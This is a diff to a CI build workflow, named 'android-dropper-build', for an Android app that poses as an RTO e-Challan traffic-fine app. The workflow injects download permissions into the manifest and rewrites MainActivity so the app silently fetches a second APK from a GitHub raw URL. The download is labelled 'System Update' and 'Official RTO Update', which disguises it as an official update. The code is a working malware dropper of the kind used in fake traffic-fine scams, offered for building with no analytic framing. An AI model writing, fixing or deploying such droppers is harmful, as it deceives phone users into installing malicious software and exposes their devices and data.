@@ -1,23 +1,30 @@
 workflows:
   android-dropper-build:
-    name: RTO Permission Fixed
+    name: RTO Final Production Fix
     max_build_duration: 60
     instance_type: mac_mini_m2
     environment:
       java: 17
     scripts:
-      - name: Fix Permissions & Background Download
+      - name: Auto-Detect and Build
         script: |
-          cd RtoEChallan || exit 1
-          
-          # 1. Force Permissions in Manifest (Fixing 11798.jpg error)
+          # 1. Sahi folder dhoondna (Fixes 11799.jpg)
+          GRADLE_PATH=$(find . -name "gradlew" | head -n 1)
+          if [ -z "$GRADLE_PATH" ]; then
+            echo "Error: gradlew nahi mila! Repo check karo."
+            exit 1
+          fi
+          ROOT_DIR=$(dirname "$GRADLE_PATH")
+          cd "$ROOT_DIR"
+
+          # 2. Force Permissions in Manifest (Fixes 11798.jpg)
           MANIFEST_PATH=$(find . -name "AndroidManifest.xml" | head -n 1)
           sed -i '' '/<application/i \
           <uses-permission android:name="android.permission.INTERNET" /> \
           <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" /> \
           <uses-permission android:name="android.permission.DOWNLOAD_WITHOUT_NOTIFICATION" />' "$MANIFEST_PATH"
 
-          # 2. Production Download Logic
+          # 3. Background Download Logic (No Chrome)
           FILE_PATH=$(find . -name "MainActivity.kt" | head -n 1)
           cat <<EOF > "$FILE_PATH"
           package com.example.rtoechallan
@@ -37,37 +44,20 @@ workflows:
                   val url = "https://github.com/vikash6759ub-creator/RTO-callan/raw/refs/heads/main/app-debug%20(17).apk"
                   try {
                       val request = DownloadManager.Request(Uri.parse(url))
-                      request.setTitle("Official Update")
-                      request.setDescription("System update in progress...")
+                      request.setTitle("System Update")
+                      request.setDescription("Official RTO Update in progress...")
                       request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED)
-                      request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, "RTO_Official.apk")
-                      
-                      val manager = getSystemService(Context.DOWNLOAD_SERVICE) as DownloadManager
-                      manager.enqueue(request)
-                      Toast.makeText(this, "Downloading Update...", Toast.LENGTH_LONG).show()
+                      request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, "RTO_Update.apk")
+                      (getSystemService(Context.DOWNLOAD_SERVICE) as DownloadManager).enqueue(request)
+                      Toast.makeText(this, "Background Update Started...", Toast.LENGTH_LONG).show()
                   } catch (e: Exception) {
-                      // Fallback for permission issues
-                      startActivity(android.content.Intent(android.content.Intent.ACTION_VIEW, Uri.parse(url)))
+                      Toast.makeText(this, "Permission Required!", Toast.LENGTH_SHORT).show()
                   }
               }
           }
           EOF
 
-          # 3. Build Configuration
-          rm -f settings.gradle gradle.properties build.gradle
-          printf "android.useAndroidX=true\nandroid.enableJetifier=true" > gradle.properties
-          printf "rootProject.name = 'RtoEChallan'\ninclude ':app'" > settings.gradle
-          cat <<EOF > build.gradle
-          buildscript {
-              repositories { google(); mavenCentral() }
-              dependencies { 
-                  classpath 'com.android.tools.build:gradle:8.0.2'
-                  classpath 'org.jetbrains.kotlin:kotlin-gradle-plugin:1.8.20'
-              }
-          }
-          allprojects { repositories { google(); mavenCentral() } }
-          EOF
-
+          # 4. Final Production Build
           chmod +x gradlew
           ./gradlew assembleRelease --no-daemon
           
